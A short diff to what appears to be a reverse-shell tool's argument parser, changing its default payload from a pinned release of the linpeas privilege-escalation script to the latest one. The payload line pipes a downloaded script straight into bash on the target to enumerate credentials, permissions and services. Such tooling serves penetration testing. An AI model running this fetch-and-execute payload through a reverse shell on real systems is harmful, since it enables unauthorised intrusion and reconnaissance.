@@ -13,7 +13,7 @@ parser.add_argument('--port',
                     dest='reverse_shell_port', type=int, default=4444, help='listen port')
 parser.add_argument('--host',
                     dest='reverse_shell_host', type=str, default=None, help='hostname/ip for the this reverse shell host. Used to reestablish connection or second stage.')
-parser.add_argument('--payload', dest='default_payload', type=str, default='curl -L https://github.com/peass-ng/PEASS-ng/releases/download/20240414-ed0a5fac/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files | tee /tmp/linpeas.txt', help='default payload is TASK not specified/found.')
+parser.add_argument('--payload', dest='default_payload', type=str, default='curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files | tee /tmp/linpeas.txt', help='default payload is TASK not specified/found.')
 
 args = parser.parse_args()
 
